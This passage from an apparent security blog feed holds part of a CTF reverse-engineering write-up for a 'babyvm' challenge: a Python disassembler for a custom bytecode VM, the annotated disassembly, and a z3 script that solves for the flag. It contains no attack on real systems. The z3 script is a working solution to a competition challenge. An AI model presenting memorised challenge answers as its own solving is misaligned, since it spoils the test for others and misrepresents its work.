<span class="number">0xA</span>: <span class="string">"mul"</span>,</span><br><span class="line">    <span class="number">0xB</span>: <span class="string">"div"</span>,</span><br><span class="line">    <span class="number">0xC</span>: <span class="string">"xor"</span>,</span><br><span class="line">    <span class="number">0xD</span>: <span class="string">"push"</span>, <span class="comment"># reg</span></span><br><span class="line">    <span class="number">0xE</span>: <span class="string">"cmp"</span>,</span><br><span class="line">    <span class="number">0xF</span>: <span class="string">"and"</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">"or"</span>,</span><br><span class="line">    <span class="number">0x11</span>: <span class="string">"ror"</span>,</span><br><span class="line">    <span class="number">0x12</span>: <span class="string">"rol"</span>,</span><br><span class="line">    <span class="number">0x13</span>: <span class="string">"neg"</span>,</span><br><span class="line">    <span class="number">0x14</span>: <span class="string">"mod"</span>,</span><br><span class="line">    <span class="number">0xD0</span>: <span class="string">"push"</span>,</span><br><span class="line">    <span class="number">0xE0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack</span></span><br><span class="line">    <span class="number">0xF0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack (imm)</span></span><br><span class="line">    <span class="number">0xFF</span>: <span class="string">"halt"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pc &lt; len(ins):</span><br><span class="line">    print(hex(pc) + <span class="string">": "</span>),</span><br><span class="line"></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    op = ins[pc]</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0x0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">5</span>]) + <span class="string">" "</span></span><br><span class="line">        res +=  <span class="string">"[$sp + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span></span><br><span class="line">        pc += <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x1</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x2</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x3</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x4</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x5</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x6</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x7</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x8</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x9</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xA</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xB</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xC</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xD</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xE</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xF</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x10</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x11</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x12</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x13</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x14</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xD0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"[$data + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span> + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xE0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"[$sp + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span> + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">5</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xF0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"[$sp + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span> + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">8</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">7</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">6</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">5</span>])</span><br><span class="line">        pc += <span class="number">9</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xFF</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(res)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure> 提取结果： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>:  push [$data + <span class="number">4</span> * <span class="number">0</span>] </span><br><span class="line"><span class="number">0x5</span>:  pop r1 </span><br><span class="line"><span class="number">0x7</span>:  push r1 </span><br><span class="line"><span class="number">0x9</span>:  pop r4 </span><br><span class="line"><span class="number">0xb</span>:  push <span class="number">0x10</span></span><br><span class="line"><span class="number">0x10</span>:  pop r1 </span><br><span class="line"><span class="number">0x12</span>:  push <span class="number">0x0</span></span><br><span class="line"><span class="number">0x17</span>:  pop r3 </span><br><span class="line"><span class="number">0x19</span>:  push <span class="number">0x1</span></span><br><span class="line"><span class="number">0x1e</span>:  pop r2 </span><br><span class="line"><span class="number">0x20</span>:  sub r1 r2 </span><br><span class="line"><span class="number">0x23</span>:  push r1 </span><br><span class="line"><span class="number">0x25</span>:  pop r5 </span><br><span class="line"><span class="number">0x27</span>:  push <span class="number">0x8</span></span><br><span class="line"><span class="number">0x2c</span>:  pop r6 </span><br><span class="line"><span class="number">0x2e</span>:  mod r5 r6 </span><br><span class="line"><span class="number">0x31</span>:  ror r4 r5 </span><br><span class="line"><span class="number">0x34</span>:  push <span class="number">0x9e3779b9</span></span><br><span class="line"><span class="number">0x39</span>:  pop r5 </span><br><span class="line"><span class="number">0x3b</span>:  xor r4 r5                  <span class="comment"># r4 = ror(input, i % 0x10) ^ 0x9e3779b9</span></span><br><span class="line"><span class="number">0x3e</span>:  push r4 </span><br><span class="line"><span class="number">0x40</span>:  call <span class="number">0xad</span>                  </span><br><span class="line"><span class="number">0x45</span>:  xor r4 r1                  </span><br><span class="line"><span class="number">0x48</span>:  pop r4                     <span class="comment"># return here      r4 = rol(r4, 6)             # input[0] = r4</span></span><br><span class="line"><span class="number">0x4a</span>:  cmp r1 r3 </span><br><span class="line"><span class="number">0x4d</span>:  neg rflag                  <span class="comment"># loop 0x10 times</span></span><br><span class="line"><span class="number">0x4e</span>:  je <span class="number">0x19</span></span><br><span class="line"><span class="number">0x53</span>:  push [$data + <span class="number">4</span> * <span class="number">1</span>] </span><br><span class="line"><span class="number">0x58</span>:  push [$data + <span class="number">4</span> * <span class="number">2</span>] </span><br><span class="line"><span class="number">0x5d</span>:  pop r2 </span><br><span class="line"><span class="number">0x5f</span>:  pop r3 </span><br><span class="line"><span class="number">0x61</span>:  push r4 </span><br><span class="line"><span class="number">0x63</span>:  pop r5 </span><br><span class="line"><span class="number">0x65</span>:  <span class="keyword">or</span> r5 r2                   </span><br><span class="line"><span class="number">0x68</span>:  <span class="keyword">or</span> r5 r3                   <span class="comment"># input[0] | input[1] | input[2]</span></span><br><span class="line"><span class="number">0x6b</span>:  push r5 </span><br><span class="line"><span class="number">0x6d</span>:  push r4 </span><br><span class="line"><span class="number">0x6f</span>:  pop r5 </span><br><span class="line"><span class="number">0x71</span>:  <span class="keyword">and</span> r5 r2 </span><br><span class="line"><span class="number">0x74</span>:  <span class="keyword">and</span> r5 r3                  <span class="comment"># input[0] &amp; input[1] &amp; input[2]</span></span><br><span class="line"><span class="number">0x77</span>:  push r5 </span><br><span class="line"><span class="number">0x79</span>:  push r4  </span><br><span class="line"><span class="number">0x7b</span>:  pop r5 </span><br><span class="line"><span class="number">0x7d</span>:  <span class="keyword">and</span> r5 r2                  <span class="comment"># input[0] &amp; input[2]</span></span><br><span class="line"><span class="number">0x80</span>:  push r5 </span><br><span class="line"><span class="number">0x82</span>:  push r4 </span><br><span class="line"><span class="number">0x84</span>:  pop r5 </span><br><span class="line"><span class="number">0x86</span>:  <span class="keyword">and</span> r5 r3                  <span class="comment"># input[0] &amp; input[1]</span></span><br><span class="line"><span class="number">0x89</span>:  push r5 </span><br><span class="line"><span class="number">0x8b</span>:  push r2 </span><br><span class="line"><span class="number">0x8d</span>:  pop r5 </span><br><span class="line"><span class="number">0x8f</span>:  <span class="keyword">and</span> r5 r3                  <span class="comment"># input[2] &amp; input[1]</span></span><br><span class="line"><span class="number">0x92</span>:  pop r6 </span><br><span class="line"><span class="number">0x94</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0x97</span>:  pop r6 </span><br><span class="line"><span class="number">0x99</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0x9c</span>:  pop r6 </span><br><span class="line"><span class="number">0x9e</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0xa1</span>:  pop r6 </span><br><span class="line"><span class="number">0xa3</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0xa6</span>:  push r5                    <span class="comment"># xor and neg</span></span><br><span class="line"><span class="number">0xa8</span>:  pop r1 </span><br><span class="line"><span class="number">0xaa</span>:  neg r1 </span><br><span class="line"><span class="number">0xac</span>:  halt </span><br><span class="line"><span class="number">0xad</span>:  mov r1 [$sp + <span class="number">4</span> * <span class="number">8</span>]</span><br><span class="line"><span class="number">0xb3</span>:  push <span class="number">0x3</span></span><br><span class="line"><span class="number">0xb8</span>:  pop r2 </span><br><span class="line"><span class="number">0xba</span>:  add r1 r2              <span class="comment"># ret_addr += 3 ==&gt; 0x48</span></span><br><span class="line"><span class="number">0xbd</span>:  mov [$sp + <span class="number">4</span> * <span class="number">8</span>] r1 </span><br><span class="line"><span class="number">0xc3</span>:  mov r2 [$sp + <span class="number">4</span> * <span class="number">9</span>]</span><br><span class="line"><span class="number">0xc9</span>:  push <span class="number">0x6</span></span><br><span class="line"><span class="number">0xce</span>:  pop r3 </span><br><span class="line"><span class="number">0xd0</span>:  rol r2 r3 </span><br><span class="line"><span class="number">0xd3</span>:  mov [$sp + <span class="number">4</span> * <span class="number">9</span>] r2 </span><br><span class="line"><span class="number">0xd9</span>:  ret</span><br></pre></td></tr></table></figure></li><li>z3约束求解： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(v8)</span>:</span></span><br><span class="line">    v13 = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        v10 = <span class="number">0</span></span><br><span class="line">        v8 ^= <span class="number">0xC3</span></span><br><span class="line">        v13.append(v8&amp;<span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            v10 ^= (v8 &gt;&gt; l) &amp; <span class="number">1</span></span><br><span class="line">        v8 = (v10 | <span class="number">2</span> * v8)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> v13</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        cipher = ((cipher &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">26</span>) | (cipher &gt;&gt; <span class="number">6</span>)</span><br><span class="line">        cipher ^= <span class="number">0x9e3779b9</span></span><br><span class="line">        cipher = ((cipher &lt;&lt; (i % <span class="number">0x8</span>)) &amp; <span class="number">0xFFFFFFFF</span>) | ((cipher &gt;&gt; (<span class="number">32</span> - (i % <span class="number">0x8</span>))))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(v1, v2, v3, v4)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res = (res + (v1 &amp; <span class="number">0xFF</span>) + (v2 &amp; <span class="number">0xFF</span>) + (v3 &amp; <span class="number">0xFF</span>) + (v4 &amp; <span class="number">0xFF</span>)) % <span class="number">100</span></span><br><span class="line">        v1 &gt;&gt;= <span class="number">8</span></span><br><span class="line">        v2 &gt;&gt;= <span class="number">8</span></span><br><span class="line">        v3 &gt;&gt;= <span class="number">8</span></span><br><span class="line">        v4 &gt;&gt;= <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">in2 = [<span class="number">0x0C5D83690</span>, <span class="number">0x978162EA</span>, <span class="number">0x1932A96C</span>, <span class="number">0x4222669</span>]</span><br><span class="line">out = [<span class="number">0x1F7902CC</span>, <span class="number">0x2FAE3D15</span>, <span class="number">0x0CEEBFE91</span>, <span class="number">0x0AFF6AF42</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v8 <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    in3 = foo(v8)</span><br><span class="line">    in3 = <span class="string">""</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> in3])</span><br><span class="line">    <span class="comment"># print len(in3)</span></span><br><span class="line">    in3 = md5(in3).digest()</span><br><span class="line">    solver = Solver()</span><br><span class="line">    k = [BitVec(<span class="string">'k%d'</span>%i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        x1 = bytes_to_long(in3[<span class="number">4</span>*i:(i+<span class="number">1</span>)*<span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">        x2 = in2[i]</span><br><span class="line">        solver.add(((x1&amp;x2&amp;k[i]) ^ (x1|x2|k[i]) ^ (x1&amp;x2) ^ (x1&amp;k[i]) ^ (x2&amp;k[i]))^<span class="number">0xFFFFFFFF</span> == out[i])</span><br><span class="line">    solver.check()</span><br><span class="line">    x0 = solver.model().eval(k[<span class="number">0</span>]).as_long() </span><br><span class="line">    x1 = solver.model().eval(k[<span class="number">1</span>]).as_long()</span><br><span class="line">    x2 = solver.model().eval(k[<span class="number">2</span>]).as_long()</span><br><span class="line">    x3 = solver.model().eval(k[<span class="number">3</span>]).as_long()</span><br><span class="line">    x0 = decrypt(x0)</span><br><span class="line">    x1 = decrypt(x1)</span><br><span class="line">    x2 = decrypt(x2)</span><br><span class="line">    x3 = decrypt(x3)</span><br><span class="line">    <span class="comment"># print x0,x1,x2,x3</span></span><br><span class="line">    res = count(x0,x1,x2,x3)</span><br><span class="line">    <span class="comment"># print res</span></span><br><span class="line">    <span class="keyword">if</span> res == v8:</span><br><span class="line">        <span class="keyword">print</span> x0,x1,x2,x3</span><br><span class="line">        final = (long_to_bytes(x0)[::<span class="number">-1</span>]+long_to_bytes(x1)[::<span class="number">-1</span>]+long_to_bytes(x2)[::<span class="number">-1</span>]+long_to_bytes(x3)[::<span class="number">-1</span>]).encode(<span class="string">"hex"</span>)</span><br><span class="line">        <span class="keyword">print</span> final</span><br><span class="line"></span><br><span class="line">        flag = <span class="string">"flag&#123;"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(final)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">8</span> <span class="keyword">or</span> i == <span class="number">12</span> <span class="keyword">or</span> i == <span class="number">16</span> <span class="keyword">or</span> i == <span class="number">20</span>:</span><br><span class="line">                flag += <span class="string">"-"</span></span><br><span class="line">            flag += final[i]</span><br><span class="line">        flag += <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">        print(flag)</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0C5D83690h, 1F7902CCh, 978162EAh, 2FAE3D15h, 1932A96Ch</span></span><br><span class="line"><span class="string">.data:00007FF6501E20E0                                         ; DATA XREF: sub_7FF6500BCCB0+55↑o</span></span><br><span class="line"><span class="string">.data:00007FF6501E20E0                 dd 0CEEBFE91h, 4222669h, 0AFF6AF42h,</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn学艺不精，确认过名字，是我没学过的类型。就搞了一个babyvm，java是后来看的，还有个babyperf，最近rev做得少，没见过，还没搞出来，学一波先。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="rev" scheme="https://n0nop.com/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: ROP（续）</title>
    <link href="https://n0nop.com/2020/05/13/kernel-pwn-ROP%EF%BC%88%E7%BB%AD%EF%BC%89/"/>
    <id>https://n0nop.com/2020/05/13/kernel-pwn-ROP%EF%BC%88%E7%BB%AD%EF%BC%89/</id>
    <published>2020-05-13T01:20:41.000Z</published>
    <updated>2021-03-28T14:15:39.431Z</updated>
    
